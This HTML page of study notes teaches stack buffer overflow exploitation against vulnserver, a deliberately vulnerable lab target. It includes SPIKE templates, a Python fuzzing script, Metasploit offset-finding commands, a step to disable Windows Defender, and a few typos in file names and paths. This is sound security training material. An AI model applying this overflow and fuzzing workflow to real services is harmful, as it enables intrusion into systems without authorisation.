<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>exploit development</title>
</head><body><b>Installation</b><br/>
<br/>
1-your victim machine is <b>vulnserver</b>--&gt;it's going to allow us to write a custome exploit against it and get a reverse shell<br/>
<br/>
2-we download <b>immunity debugger</b>---&gt;this is going to allow us to run the program through this debugger, so when we are triggering different types of exploits we can see how it's affecting the memory and stack<br/>
<br/>
--&gt;so our goal here is to be able to write our own exploit code by the end of this<br/>
----------------------------------------------------------------------- <br/>
<b>Anatomy of memory<br/>
<br/>
</b><img src="anatomy.png" /><b><br/>
</b><b><br/>
</b><img src="stack.png" /><b><br/>
</b><b><br/>
</b><b>--&gt;</b>if you properly sanitizing your buffer space then if you send a bunch of characters, A's for example, you should reach EBP and stop, now however if you have a buffer overflow attack then you actually overflow the buffer space you using and reach over the EBP into something called EIP, now EIP is where things get interesting, this is a pointer address or a return address, so we can use this address to point to directions that we instruct, now these directions are actually going to be a malicious code that gives us a reverse shell<br/>
<br/>
<img src="stack2.png" /><br/>
<br/>
<br/>
<b>Steps to conduct a buffer overflow</b><br/>
<br/>
1-<b>Spiking</b>--&gt;method that we use to find a vulnerable part of a program<br/>
<br/>
2-<b>Fuzzing</b>--&gt;it's similar to spiking, we are going to send a bunch of characters at a program and see if we can break it <br/>
<br/>
3-<b>Finding the Offset</b>--&gt;if we break it, we want to find out at what point we did break it<br/>
<br/>
4-<b>Overwriting the EIP</b>--&gt;we use that offset to overwrite the EIP<br/>
<br/>
5-<b>Finding Bad Characters</b>--&gt;once we have EIP controlled, we need to do a few house cleanup things, one is called finding bad characters, second:<br/>
<br/>
6-<b>Finding the right module<br/>
</b><b><br/>
</b>7-<b>Generating Shellcode</b>--&gt;this malicious shellcode that will allow us to get this reversed shell, we're going to point that EIP to our malicious shellcode<br/>
<br/>
8-<b>Root!</b><br/>
----------------------------------------------------------------------------<br/>
<b>Spiking<br/>
<br/>
</b>(vulnserver run on 9999)<b><br/>
</b><b><br/>
</b>1-make sure to turn off real time protection of windows defender<br/>
<br/>
2-run vulnserver and immunity debugger as adminstrator<br/>
<br/>
3-in immunity debugger--&gt;file--&gt;attach--&gt;vulnserver--&gt;click on play button<br/>
<br/>
4-find you host(windows) ip address then run on kali machine(attacker)#nc -nv &lt;host ip&gt; 9999<br/>
HELP<br/>
--&gt;we will focus on TRUN command, so we want to find how TRUN is vulnerable, so we're going to do Spiking which mean throw a bunch of characters at you and see if i can overflow that buffer, for Spiking we're gonna use tool called generic_send_tcp<br/>
EXIT<br/>
#generic_send_tcp<br/>
#gedit stats.spk<br/>
put in file:<br/>
s_readline();<br/>
s_string("STATS ");<br/>
s_string_variable("0");<br/>
#generic_send_tcp 192.168.1.2 9999 stats.spk 0 0<br/>
#gedit trun.spk<br/>
put in file:<br/>
s_readline();<br/>
s_string("TRUN ");<br/>
s_string_variable("0");<br/>
#generic_send_tcp 192.168.1.2 9999 turn.spk 0 0<br/>
--&gt;ctrl+s when you find blank screen on immunity debugger, this mean there is something vulnerable here<br/>
------------------------------------------------------------------------<br/>
<b>Fuzzing<br/>
<br/>
</b>--&gt;after we know that turn command is vurnable we're gonna attack that command specifically<br/>
<br/>
1-close immunity and vulnserver and reopen if they are still open<br/>
<br/>
2-write 1.py script file:<br/>
<br/>
#!/usr/bin/python<br/>
import sys, socket<br/>
from time import sleep<br/>
<br/>
buffer = "A" * 100<br/>
<br/>
while True:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; try:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.connect(('192.168.1.2',9999))<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.send(('TRUN /.:/' + buffer))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.close()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sleep(1)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;buffer = buffer + "A"*100<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; except:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print "Fuzzing crashed at %s bytes" % str(len(buffer))<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sys.exit()<br/>
<br/>
-----------------------------------------------------------------------<br/>
#chmod +x 1.py<br/>
#./1.py<br/>
---------------------------------------------------------------------<br/>
<b>Finding the Offset<br/>
<br/>
</b>--&gt;we looking for where we overwrite the EIP because that's what we want to control<br/>
<br/>
#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000<br/>
<br/>
#gedit 2.py<br/>
#chmod +x 2.py<br/>
#./2.py<br/>
#/usr/share/metasploit.framework/tools/exploit/pattern_offset.rb -l 3000 -q &lt;EIP&gt;<br/>
-------------------------------------------------------------------<br/>
<b>Overwriting the EIP</b><br/>
<br/>
edit 2.py file:<br/>
<br/>
remove offset and put shellcode = "A" + &lt;number of byte offset&gt; + "B" + 4<br/>
<br/>
#./2.py<br/>
<br/>
--&gt;The EIP 42424242<br/>
--------------------------------------------------------------------<br/>
<b>Finding Bad Characters<br/>
<br/>
</b>when we make the shell we want to find bad characters for shell code<br/>
<br/>
1-google: badchars<br/>
2-edit 2.py file:<br/>
add <br/>
badchars--&gt;and delete x00\<br/>
<br/>
shellcode = "A" * &lt;number of offset byte&gt; + "B" * 4 + badchars<br/>
<br/>
#./2.py<br/>
<br/>
example for bad characters:<br/>
<br/>
<img src="bad.png" /><br/>
<br/>
-------------------------------------------------------------------------------<br/>
<div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: arial">a </span></span></div><b>shellcode</b><div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: arial"> </span></span><span style="font-family: arial"><span style="font-size: 13pt">is a small piece of code used as the payload in the exploitation of a software vulnerability. ... </span></span></div><span style="font-size: 13pt"><b>Shellcode</b><div style="text-align: left"><span style="font-family: arial"> is commonly written in machine code</span></div></span><div style="text-align: left"><span style="font-family: arial"><span style="font-size: 16pt">.<br/>
</span></span></div><div style="text-align: left"><span style="font-family: arial"><span style="font-size: 16pt">--------------------------------------------------------------------------------------------------<br/>
</span></span></div><br/>
<b><span style="font-size: 13pt"> buffer overflow</span></b>&nbsp;attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.<br/>
----------------------------------------------------------------------</body></html>